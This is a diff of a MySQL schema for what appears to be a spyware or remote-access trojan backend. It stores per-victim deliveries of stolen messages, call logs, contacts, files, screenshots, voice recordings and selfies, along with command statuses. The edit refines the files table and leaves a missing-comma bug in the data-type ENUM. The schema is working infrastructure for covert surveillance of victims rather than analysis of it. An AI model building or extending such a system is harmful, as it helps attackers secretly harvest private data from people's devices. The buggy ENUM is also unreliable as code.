@@ -76,7 +76,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
   `victim_id`            INT(11) NOT NULL,
-  `data_type`            ENUM('messages','command_statuses' 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
+  `data_type`            ENUM('messages', 'command_statuses' 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
   `error`                TINYINT(4) NOT NULL,
   `message`              TEXT NOT NULL,
   `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
@@ -179,16 +179,16 @@ DROP TABLE IF EXISTS `files`;
 CREATE TABLE IF NOT EXISTS `files` (
   `id`                   INT(11)    NOT NULL AUTO_INCREMENT,
   `file_bundle_id`       INT        NOT NULL,
-  `file_id`              INT        NOT NULL,
   `absolute_parent_path` TEXT       NOT NULL,
   `file_name`            TEXT       NOT NULL,
-  `parent_id`            INT        NOT NULL,
+  `parent_id`            INT,
   `is_directory`         TINYINT(4) NOT NULL,
   `file_size_in_kb`      INT(11)    NOT NULL,
   `file_hash`            TEXT       NOT NULL,
   `is_active`            TINYINT(4) NOT NULL DEFAULT 1,
   `last_logged_at`       TIMESTAMP  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
+  FOREIGN KEY (`parent_id`) REFERENCES `files`(`id`) ON UPDATE CASCADE ON DELETE CASCADE,
   FOREIGN KEY (`file_bundle_id`) REFERENCES `file_bundles` (`id`)
     ON UPDATE CASCADE
     ON DELETE CASCADE
